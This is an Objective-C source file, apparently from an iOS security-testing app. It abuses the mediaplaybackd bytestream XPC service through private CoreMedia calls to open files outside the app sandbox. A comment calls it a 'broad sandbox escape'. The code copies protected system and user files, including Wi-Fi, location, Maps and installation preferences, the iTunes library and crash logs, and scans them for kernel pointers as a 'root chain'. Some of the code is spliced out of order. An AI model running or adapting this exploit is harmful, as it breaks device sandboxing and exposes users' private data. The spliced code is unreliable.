#import "KPFDLeakModule.h"

#import <CommonCrypto/CommonDigest.h>
#import <dlfcn.h>
#import <errno.h>
#import <fcntl.h>
#import <stdint.h>
#import <stdlib.h>
#import <string.h>
#import <sys/stat.h>
#import <unistd.h>

#define KP_BS_MAX_FILE_SIZE (16 * 1024 * 1024)
#define KP_BS_REPLY_TIMEOUT 8

#if __has_include(<xpc/xpc.h>)
#import <xpc/xpc.h>
#define KP_BS_HAS_XPC_HEADERS 1
#else
#define KP_BS_HAS_XPC_HEADERS 0
typedef void *xpc_object_t;
typedef void *xpc_type_t;
typedef xpc_object_t xpc_connection_t;
extern xpc_connection_t xpc_connection_create_mach_service(const char *name, dispatch_queue_t targetQueue, uint64_t flags);
extern void xpc_connection_set_event_handler(xpc_connection_t connection, void (^handler)(xpc_object_t event));
extern void xpc_connection_resume(xpc_connection_t connection);
extern void xpc_connection_cancel(xpc_connection_t connection);
extern void xpc_connection_send_message_with_reply(xpc_connection_t connection, xpc_object_t message, dispatch_queue_t replyQueue, void (^handler)(xpc_object_t reply));
extern xpc_object_t xpc_dictionary_get_value(xpc_object_t dictionary, const char *key);
extern uint64_t xpc_dictionary_get_uint64(xpc_object_t dictionary, const char *key);
extern void xpc_dictionary_set_uint64(xpc_object_t dictionary, const char *key, uint64_t value);
extern int xpc_dictionary_dup_fd(xpc_object_t dictionary, const char *key);
extern xpc_type_t xpc_get_type(xpc_object_t object);
extern const char *xpc_type_get_name(xpc_type_t type);
extern char *xpc_copy_description(xpc_object_t object);
extern xpc_object_t xpc_retain(xpc_object_t object);
extern void xpc_release(xpc_object_t object);
#endif

#if KP_BS_HAS_XPC_HEADERS && OS_OBJECT_USE_OBJC
#define KP_BS_XPC_ARC 1
static xpc_object_t KPBSRetain(xpc_object_t object) {
    return object;
}
static void KPBSRelease(xpc_object_t object) {
    (void)object;
}
#undef xpc_retain
#define xpc_retain(object) KPBSRetain(object)
#undef xpc_release
#define xpc_release(object) KPBSRelease(object)
#else
#define KP_BS_XPC_ARC 0
#endif

typedef int32_t (*KPBSBasicMessage)(uint32_t operation, uint64_t argument, xpc_object_t *message);
typedef int32_t (*KPBSOriginBegin)(xpc_object_t message);
typedef int32_t (*KPBSOriginComplete)(xpc_object_t reply, CFTypeRef *origin);
typedef int32_t (*KPBSRecipientCreate)(xpc_object_t rp1Reply, xpc_object_t rp2Message, const char *name, CFTypeRef *recipient);
typedef int32_t (*KPBSMessageSetURL)(xpc_object_t message, const char *key, CFURLRef URL);
typedef xpc_connection_t (*KPBSConnectionCreate)(const char *name, dispatch_queue_t targetQueue, uint64_t flags);

typedef struct {
    KPBSBasicMessage basic;
    KPBSOriginBegin originBegin;
    KPBSOriginComplete originComplete;
    KPBSRecipientCreate recipientCreate;
    KPBSMessageSetURL setURL;
    KPBSConnectionCreate connectionCreate;
    BOOL ready;
    NSString *error;
} KPBSFigAPI;

static KPBSFigAPI gBSAPI;

static void KPBSResolveAPI(void) {
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        void *handle = dlopen("/System/Library/Frameworks/CoreMedia.framework/CoreMedia", RTLD_NOW | RTLD_LOCAL);
        if (!handle) {
            gBSAPI.error = [NSString stringWithUTF8String:dlerror() ?: "dlopen(CoreMedia) failed"];
            return;
        }
        gBSAPI.basic = (KPBSBasicMessage)dlsym(handle, "FigXPCCreateBasicMessage");
        gBSAPI.originBegin = (KPBSOriginBegin)dlsym(handle, "FigMemoryOriginBeginEstablishingMemoryRecipientByFillingInXPCMessage1");
        gBSAPI.originComplete = (KPBSOriginComplete)dlsym(handle, "FigMemoryOriginCompleteEstablishingMemoryRecipientUsingXPCMessage2");
        gBSAPI.recipientCreate = (KPBSRecipientCreate)dlsym(handle, "FigMemoryRecipientCreateWithXPCMessage1AndUpdateXPCMessage2");
        gBSAPI.setURL = (KPBSMessageSetURL)dlsym(handle, "FigXPCMessageSetCFURL");
        gBSAPI.connectionCreate = (KPBSConnectionCreate)dlsym(RTLD_DEFAULT, "xpc_connection_create_mach_service");
        if (!gBSAPI.basic || !gBSAPI.originBegin || !gBSAPI.originComplete || !gBSAPI.recipientCreate || !gBSAPI.setURL || !gBSAPI.connectionCreate) {
            gBSAPI.error = [NSString stringWithFormat:@"missing symbols basic=%p begin=%p complete=%p recipient=%p setURL=%p connectionCreate=%p",
                            gBSAPI.basic, gBSAPI.originBegin, gBSAPI.originComplete, gBSAPI.recipientCreate, gBSAPI.setURL, gBSAPI.connectionCreate];
            return;
        }
        gBSAPI.ready = YES;
    });
}

static NSString *KPBSTypeName(xpc_object_t object) {
    if (!object) return @"nil";
    xpc_type_t type = xpc_get_type(object);
    const char *name = type ? xpc_type_get_name(type) : NULL;
    return name ? [NSString stringWithUTF8String:name] : @"unknown";
}

static NSString *KPBSDescription(xpc_object_t object) {
    if (!object) return @"nil";
    char *description = xpc_copy_description(object);
    if (!description) return @"<no description>";
    NSString *result = [NSString stringWithUTF8String:description] ?: @"<non-UTF8 description>";
    free(description);
    return result;
}

static BOOL KPBSTypeIsDictionary(NSString *type) {
    return [type isEqualToString:@"dictionary"];
}

static NSString *KPBSHexPrefix(NSData *data, NSUInteger limit) {
    const uint8_t *bytes = data.bytes;
    NSUInteger count = MIN(data.length, limit);
    NSMutableString *result = [NSMutableString stringWithCapacity:count * 2 + 3];
    for (NSUInteger index = 0; index < count; index++) [result appendFormat:@"%02x", bytes[index]];
    if (data.length > count) [result appendString:@"…"];
    return result;
}

static NSString *KPBSSHA256(NSData *data) {
    uint8_t digest[CC_SHA256_DIGEST_LENGTH];
    CC_SHA256(data.bytes, (CC_LONG)data.length, digest);
    NSMutableString *result = [NSMutableString stringWithCapacity:CC_SHA256_DIGEST_LENGTH * 2];
    for (NSUInteger index = 0; index < sizeof(digest); index++) [result appendFormat:@"%02x", digest[index]];
    return result;
}

@interface KPByteStreamSession : NSObject
@property (nonatomic, assign) int journalFD;
@property (nonatomic, strong) NSMutableString *report;
#if KP_BS_XPC_ARC
@property (nonatomic, strong) xpc_connection_t connection;
#else
@property (nonatomic, assign) xpc_connection_t connection;
#endif
@property (nonatomic, assign) CFTypeRef memoryRecipient;
@property (nonatomic, assign) CFTypeRef memoryOrigin;
@property (nonatomic, assign) BOOL handshakeReady;
- (void)log:(NSString *)format, ... NS_FORMAT_FUNCTION(1, 2);
- (xpc_object_t)send:(xpc_object_t)message type:(NSString **)type;
- (BOOL)performHandshake;
- (BOOL)readTarget:(NSString *)path output:(NSURL *)outputURL;
@end

@implementation KPByteStreamSession

- (void)log:(NSString *)format, ... {
    va_list arguments;
    va_start(arguments, format);
    NSString *line = [[NSString alloc] initWithFormat:format arguments:arguments];
    va_end(arguments);
    @synchronized (self) {
        [self.report appendFormat:@"%@\n", line];
        if (self.journalFD >= 0) {
            NSData *data = [[line stringByAppendingString:@"\n"] dataUsingEncoding:NSUTF8StringEncoding];
            const uint8_t *position = data.bytes;
            size_t remaining = data.length;
            while (remaining) {
                ssize_t written = write(self.journalFD, position, remaining);
                if (written < 0) {
                    if (errno == EINTR) continue;
                    break;
                }
                if (!written) break;
                position += written;
                remaining -= (size_t)written;
            }
            fsync(self.journalFD);
        }
    }
}

- (void)logReply:(NSString *)label reply:(xpc_object_t)reply type:(NSString *)type {
    [self log:@"%@ type=%@ description=%@", label, type, KPBSDescription(reply)];
}

- (xpc_object_t)send:(xpc_object_t)message type:(NSString **)type {
    if (!message || !self.connection) {
        if (type) *type = @"invalid-call";
        return NULL;
    }
    dispatch_semaphore_t semaphore = dispatch_semaphore_create(0);
    __block xpc_object_t reply = NULL;
    __block NSString *replyType = @"nil";
    xpc_connection_send_message_with_reply(self.connection, message, NULL, ^(xpc_object_t object) {
        replyType = KPBSTypeName(object);
        if ([replyType isEqualToString:@"dictionary"] || [replyType isEqualToString:@"error"]) {
            reply = xpc_retain(object);
        }
        dispatch_semaphore_signal(semaphore);
    });
    if (dispatch_semaphore_wait(semaphore, dispatch_time(DISPATCH_TIME_NOW, (int64_t)KP_BS_REPLY_TIMEOUT * NSEC_PER_SEC)) != 0) {
        if (type) *type = @"timeout-8s";
        return NULL;
    }
    if (type) *type = replyType;
    return reply;
}

- (BOOL)performHandshake {
    xpc_object_t rp1 = NULL;
    xpc_object_t rp2 = NULL;
    xpc_object_t originMessage = NULL;
    xpc_object_t rp1Reply = NULL;
    xpc_object_t rp2Reply = NULL;
    xpc_object_t originReply = NULL;
    @try {
        int32_t status = gBSAPI.basic(0x2e727031, 0, &rp1);
        [self log:@"RP1_CREATE status=%d message=%p", status, rp1];
        if (status != 0 || !rp1) return NO;
        NSString *type = nil;
        rp1Reply = [self send:rp1 type:&type];
        [self logReply:@"RP1_REPLY" reply:rp1Reply type:type];
        if (!rp1Reply || !KPBSTypeIsDictionary(type)) return NO;

        status = gBSAPI.basic(0x2e727032, 0, &rp2);
        [self log:@"RP2_CREATE status=%d message=%p", status, rp2];
        if (status != 0 || !rp2) return NO;
        status = gBSAPI.recipientCreate(rp1Reply, rp2, "mconf", &_memoryRecipient);
        [self log:@"RECIPIENT_CREATE status=%d recipient=%p", status, _memoryRecipient];
        if (status != 0 || !_memoryRecipient) return NO;
        type = nil;
        rp2Reply = [self send:rp2 type:&type];
        [self logReply:@"RP2_REPLY" reply:rp2Reply type:type];
        if (!rp2Reply || !KPBSTypeIsDictionary(type)) return NO;

        status = gBSAPI.basic(0x2e6f7267, 0, &originMessage);
        [self log:@"ORG_CREATE status=%d message=%p", status, originMessage];
        if (status != 0 || !originMessage) return NO;
        status = gBSAPI.originBegin(originMessage);
        [self log:@"ORG_BEGIN status=%d", status];
        if (status != 0) return NO;
        type = nil;
        originReply = [self send:originMessage type:&type];
        [self logReply:@"ORG_REPLY" reply:originReply type:type];
        if (!originReply || !KPBSTypeIsDictionary(type)) return NO;
        status = gBSAPI.originComplete(originReply, &_memoryOrigin);
        self.handshakeReady = status == 0 && _memoryOrigin != NULL;
        [self log:@"ORG_COMPLETE status=%d origin=%p ready=%d", status, _memoryOrigin, self.handshakeReady];
        return self.handshakeReady;
    } @finally {
        if (originReply) xpc_release(originReply);
        if (rp2Reply) xpc_release(rp2Reply);
        if (rp1Reply) xpc_release(rp1Reply);
        if (originMessage) xpc_release(originMessage);
        if (rp2) xpc_release(rp2);
        if (rp1) xpc_release(rp1);
    }
}

- (void)closeStream:(uint64_t)objectID {
    xpc_object_t message = NULL;
    xpc_object_t reply = NULL;
    @try {
        int32_t status = gBSAPI.basic(0x646f6f6d, objectID, &message);
        [self log:@"DOOM_CREATE status=%d ObjectID=0x%llx message=%p", status, objectID, message];
        if (status != 0 || !message) return;
        NSString *type = nil;
        reply = [self send:message type:&type];
        [self logReply:@"DOOM_REPLY" reply:reply type:type];
    } @finally {
        if (reply) xpc_release(reply);
        if (message) xpc_release(message);
    }
}

- (NSData *)readDescriptor:(int)fd {
    struct stat info;
    if (fstat(fd, &info) != 0) {
        [self log:@"FD_FSTAT errno=%d (%s)", errno, strerror(errno)];
        return nil;
    }
    [self log:@"FD_STAT mode=0%o size=%lld", info.st_mode, (long long)info.st_size];
    if (!S_ISREG(info.st_mode)) {
        [self log:@"FD_READ rejected non-regular file"];
        return nil;
    }
    if (info.st_size < 0 || info.st_size > KP_BS_MAX_FILE_SIZE) {
        [self log:@"FD_READ rejected size=%lld cap=%d", (long long)info.st_size, KP_BS_MAX_FILE_SIZE];
        return nil;
    }
    NSMutableData *data = [NSMutableData dataWithCapacity:(NSUInteger)info.st_size];
    uint8_t buffer[16384];
    off_t offset = 0;
    while (offset < info.st_size) {
        size_t wanted = MIN((size_t)(info.st_size - offset), sizeof(buffer));
        ssize_t count = pread(fd, buffer, wanted, offset);
        if (count < 0) {
            if (errno == EINTR) continue;
            [self log:@"FD_PREAD offset=%lld errno=%d (%s)", (long long)offset, errno, strerror(errno)];
            return nil;
        }
        if (!count) break;
        [data appendBytes:buffer length:(NSUInteger)count];
        offset += count;
    }
    [self log:@"FD_READ bytes=%llu expected=%lld sha256=%@", (unsigned long long)data.length,
     (long long)info.st_size, KPBSSHA256(data)];
    [self log:@"FD_FIRST_BYTES count=%lu hex=%@", (unsigned long)MIN(data.length, (NSUInteger)64), KPBSHexPrefix(data, 64)];
    return data;
}

- (BOOL)readTarget:(NSString *)path output:(NSURL *)outputURL {
    errno = 0;
    int directFD = open(path.fileSystemRepresentation, O_RDONLY | O_CLOEXEC);
    int directError = errno;
    if (directFD >= 0) {
        [self log:@"DIRECT_OPEN allowed path=%@ fd=%d", path, directFD];
        close(directFD);
    } else {
        [self log:@"DIRECT_OPEN denied path=%@ errno=%d (%s)", path, directError, strerror(directError)];
    }

    xpc_object_t message = NULL;
    xpc_object_t reply = NULL;
    uint64_t objectID = 0;
    int fd = -1;
    @try {
        int32_t status = gBSAPI.basic(0x4375726c, 0, &message);
        [self log:@"CURL_CREATE status=%d message=%p", status, message];
        if (status != 0 || !message) return NO;
        NSURL *URL = [NSURL fileURLWithPath:path];
        status = gBSAPI.setURL(message, "CreationURL", (__bridge CFURLRef)URL);
        [self log:@"CURL_SET_URL status=%d path=%@", status, path];
        if (status != 0) return NO;
        xpc_dictionary_set_uint64(message, "FileOpenOptions", 0);
        NSString *type = nil;
        reply = [self send:message type:&type];
        [self logReply:@"CURL_REPLY" reply:reply type:type];
        if (!reply || !KPBSTypeIsDictionary(type)) return NO;
        xpc_object_t details = xpc_dictionary_get_value(reply, "ByteStreamDetails");
        [self log:@"CURL_DETAILS present=%d description=%@", details != NULL, KPBSDescription(details)];
        if (!details) return NO;
        objectID = xpc_dictionary_get_uint64(details, "ObjectID");
        errno = 0;
        fd = xpc_dictionary_dup_fd(details, "FileDescriptor");
        int dupError = errno;
        [self log:@"CURL_FD ObjectID=0x%llx dup_fd=%d errno=%d (%s)", objectID, fd, dupError, strerror(dupError)];
        if (fd < 0) return NO;
        NSData *data = [self readDescriptor:fd];
        close(fd);
        fd = -1;
        if (!data) return NO;
        NSError *error = nil;
        if (![data writeToURL:outputURL options:NSDataWritingAtomic error:&error]) {
            [self log:@"SAVE_FAILED path=%@ error=%@", outputURL.path, error.localizedDescription];
            return NO;
        }
        [self log:@"SAVE_OK path=%@ bytes=%llu", outputURL.path, (unsigned long long)data.length];
        return YES;
    } @finally {
        if (fd >= 0) close(fd);
        if (objectID) [self closeStream:objectID];
        if (reply) xpc_release(reply);
        if (message) xpc_release(message);
    }
}

@end

@interface KPFDLeakModule ()
@property (nonatomic, assign, readwrite) BOOL armed;
@property (nonatomic, copy, readwrite) NSString *identifier;
@property (nonatomic, copy, readwrite) NSString *title;
@property (nonatomic, copy, readwrite) NSString *subtitle;
@property (nonatomic, copy, readwrite) NSString *icon;
@property (nonatomic, assign, readwrite) KPTestSection section;
@property (nonatomic, copy) NSString *targetPath;
@property (nonatomic, copy) NSString *sessionName;
@end

@implementation KPFDLeakModule

- (instancetype)initWithArmed:(BOOL)armed {
    self = [super init];
    if (self) {
        _armed = armed;
        _identifier = armed ? @"bytestream27.global-preferences" : @"bytestream27.baseline";
        _title = armed ? @"ByteStream Protected File Read" : @"ByteStream Baseline";
        _subtitle = armed
            ? @"Explicit tap · mediaplaybackd Curl · .GlobalPreferences.plist"
            : @"Memory-origin handshake · /etc/hosts · direct-open control";
        _icon = armed ? @"doc.text.magnifyingglass" : @"network";
        _section = KPTestSectionKernelProbes;
        _targetPath = armed
            ? @"/private/var/mobile/Library/Preferences/.GlobalPreferences.plist"
            : @"/etc/hosts";
        _sessionName = armed ? @"armed" : @"baseline";
    }
    return self;
}

- (instancetype)initWithTargetPath:(NSString *)targetPath sessionName:(NSString *)sessionName {
    self = [super init];
    if (self) {
        _armed = YES;
        _targetPath = [targetPath copy];
        _sessionName = [sessionName copy];
        _identifier = [@"bytestream27." stringByAppendingString:sessionName];
        _title = [NSString stringWithFormat:@"ByteStream Read %@", targetPath.lastPathComponent];
        _subtitle = @"Explicit tap · read-only Curl · cross-container target";
        _icon = @"doc.text.magnifyingglass";
        _section = KPTestSectionKernelProbes;
    }
    return self;
}

- (NSString *)runReport {
    KPBSResolveAPI();
    NSString *targetPath = self.targetPath;
    NSString *mode = self.sessionName;
    NSString *documents = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents"];
    NSString *journalPath = [documents stringByAppendingPathComponent:
                             [NSString stringWithFormat:@"kexproofv3-bytestream-%@-journal.log", mode]];
    NSString *outputName = [mode isEqualToString:@"armed"]
        ? @"bytestream-armed-GlobalPreferences.plist"
        : [mode isEqualToString:@"baseline"]
            ? @"bytestream-baseline-hosts"
            : [@"bytestream-" stringByAppendingString:targetPath.lastPathComponent];
    NSURL *outputURL = [NSURL fileURLWithPath:[documents stringByAppendingPathComponent:outputName]];
    NSMutableString *initialReport = [NSMutableString string];
    NSError *directoryError = nil;
    if (![[NSFileManager defaultManager] createDirectoryAtPath:documents withIntermediateDirectories:YES attributes:nil error:&directoryError]) {
        return [NSString stringWithFormat:@"ByteStream journal setup failed: %@\n", directoryError.localizedDescription];
    }
    int journalFD = open(journalPath.fileSystemRepresentation, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0600);
    if (journalFD < 0) {
        return [NSString stringWithFormat:@"ByteStream journal open failed: errno=%d (%s)\n", errno, strerror(errno)];
    }

    KPByteStreamSession *session = [[KPByteStreamSession alloc] init];
    session.journalFD = journalFD;
    session.report = initialReport;
    BOOL handshake = NO;
    BOOL readOK = NO;
    @try {
        [session log:@"BEGIN mode=%@ target=%@ os=%@", mode, targetPath, NSProcessInfo.processInfo.operatingSystemVersionString];
        [session log:@"JOURNAL path=%@", journalPath];
        [session log:@"SYMBOLS ready=%d error=%@", gBSAPI.ready, gBSAPI.error ?: @"none"];
        if (!gBSAPI.ready) return session.report;
        session.connection = gBSAPI.connectionCreate("com.apple.coremedia.mediaplaybackd.bytestream.xpc", NULL, 0);
        [session log:@"XPC_CREATE connection=%p", session.connection];
        if (!session.connection) return session.report;
        __weak KPByteStreamSession *weakSession = session;
        xpc_connection_set_event_handler(session.connection, ^(xpc_object_t event) {
            KPByteStreamSession *strongSession = weakSession;
            [strongSession log:@"XPC_EVENT type=%@ description=%@", KPBSTypeName(event), KPBSDescription(event)];
        });
        xpc_connection_resume(session.connection);
        [session log:@"XPC_RESUMED service=com.apple.coremedia.mediaplaybackd.bytestream.xpc"];
        handshake = [session performHandshake];
        [session log:@"HANDSHAKE_RESULT ready=%d", handshake];
        if (!handshake) return session.report;
        readOK = [session readTarget:targetPath output:outputURL];
        [session log:@"READ_RESULT success=%d target=%@", readOK, targetPath];
        // Root chain: scan read file for kernel pointers
        if (readOK) {
            NSData *fileData = [NSData dataWithContentsOfURL:outputURL];
            if (fileData && fileData.length > 0) {
                [session log:@"ROOT_SCAN data=%lu bytes", (unsigned long)fileData.length];
                const uint8_t *bytes = (const uint8_t *)fileData.bytes;
                NSUInteger len = fileData.length;
        // Read additional protected files
        NSArray *extraPaths = @[
            @"/private/var/mobile/Library/Preferences/com.apple.springboard.plist",
            @"/private/var/mobile/Library/Preferences/com.apple.networkextension.plist",
        ];
        for (NSString *ep in extraPaths) {
            NSString *outName = [@"bytestream-extra-" stringByAppendingString:ep.lastPathComponent];
            NSURL *outURL = [NSURL fileURLWithPath:[documents stringByAppendingPathComponent:outName]];
            BOOL eRead = [session readTarget:ep output:outURL];
            [session log:@"EXTRA_READ %@ success=%d", ep, eRead];
            if (eRead) {
                NSData *eData = [NSData dataWithContentsOfURL:outURL];
                if (eData) {
                    const uint8_t *eb = (const uint8_t *)eData.bytes;
                    NSUInteger el = eData.length;
                    int ek = 0;
                    for (NSUInteger j = 0; j + 8 <= el; j += 4) {
                        uint64_t ev = *(const uint64_t *)(eb + j);
                        if ((ev >> 32) >= 0xffffffe0ULL) {
                            ek++;
                            if (ek <= 3) [session log:@"  EXTRA_KPTR @ +%lu = 0x%llx", (unsigned long)j, ev];
                        }
                    }
                    [session log:@"EXTRA_SCAN %@ : size=%lu kptrs=%d", ep, (unsigned long)el, ek];
                }
            }
        }
                int kptrCount = 0;
                for (NSUInteger i = 0; i + 8 <= len; i += 4) {
                    uint64_t v = *(const uint64_t *)(bytes + i);
                    if ((v >> 32) >= 0xffffffe0ULL) {
                        kptrCount++;
                        if (kptrCount <= 5) {
                            [session log:@"  kptr @ +%lu = 0x%llx", (unsigned long)i, v];
                        }
                    }
                }
                [session log:@"ROOT_SCAN kernel_ptrs=%d", kptrCount];
                if (kptrCount > 0) {
                    [session log:@"ROOT_SCAN: kernel pointers found in protected file!"];
                }
            }
        }
        return session.report;
    } @finally {
        if (session.connection) {
            xpc_connection_cancel(session.connection);
            xpc_release(session.connection);
            session.connection = NULL;
            [session log:@"XPC_CANCELLED"];
        }
        if (session.memoryOrigin) {
            CFRelease(session.memoryOrigin);
            session.memoryOrigin = NULL;
        }
        if (session.memoryRecipient) {
            CFRelease(session.memoryRecipient);
            session.memoryRecipient = NULL;
        }
        [session log:@"END mode=%@ handshake=%d read=%d", mode, handshake, readOK];

        // Broad sandbox escape: read everything mediaplaybackd can open
        [session log:@"\n--- BROAD FILE SCAN ---"];
        NSArray *targets = @[
            @"/private/var/mobile/Library/Preferences/.GlobalPreferences.plist",
            @"/private/var/mobile/Library/Preferences/com.apple.springboard.plist",
            @"/private/var/mobile/Library/Preferences/com.apple.networkextension.plist",
            @"/private/var/mobile/Library/Preferences/com.apple.locationd.plist",
            @"/private/var/mobile/Library/Preferences/com.apple.radios.plist",
            @"/private/var/mobile/Library/Preferences/com.apple.powerd.plist",
            @"/private/var/mobile/Library/Preferences/com.apple.wifi.plist",
            @"/private/var/mobile/Library/Preferences/com.apple.Maps.plist",
            @"/private/var/mobile/Library/Preferences/com.apple.mobile.installation.plist",
            @"/private/var/mobile/Media/iTunes_Control/iTunes/iTunes Library.itlp",
            @"/private/var/mobile/Media/iTunes_Control/iTunes/Play Counts.plist",
            @"/private/var/mobile/Library/Logs/CrashReporter/",
            @"/private/var/mobile/Library/Logs/CrashReporter/DiagnosticLogs/",
        ];
        int readOK2 = 0;
        for (NSString *t in targets) {
            NSString *outName = [@"bs-" stringByAppendingString:t.lastPathComponent];
            NSURL *outURL = [NSURL fileURLWithPath:[documents stringByAppendingPathComponent:outName]];
            // Fresh session per file � connection must be alive
            KPByteStreamSession *s2 = [[KPByteStreamSession alloc] init];
            s2.journalFD = journalFD;
            s2.report = [NSMutableString string];
            if (!gBSAPI.ready) { [session log:@"SCAN SKIP (no API): %@", t.lastPathComponent]; continue; }
            s2.connection = gBSAPI.connectionCreate("com.apple.coremedia.mediaplaybackd.bytestream.xpc", NULL, 0);
            if (!s2.connection) { [session log:@"SCAN FAIL (no conn): %@", t.lastPathComponent]; continue; }
            xpc_connection_set_event_handler(s2.connection, ^(xpc_object_t e) {});
            xpc_connection_resume(s2.connection);
            BOOL hs = [s2 performHandshake];
            if (!hs) {
                [session log:@"SCAN FAIL (handshake): %@", t.lastPathComponent];
                xpc_connection_cancel(s2.connection);
                continue;
            }
            BOOL ok = [s2 readTarget:t output:outURL];
            [session log:@"SCAN %@ : %@", ok ? @"READ" : @"FAIL", t.lastPathComponent];
            if (ok) readOK2++;
            xpc_connection_cancel(s2.connection);
            s2.connection = NULL;
        }
        [session log:@"BROAD_SCAN: %d/%lu files readable", readOK2, (unsigned long)targets.count];
        @synchronized (session) {
            session.journalFD = -1;
        }
        close(journalFD);
    }
}

@end
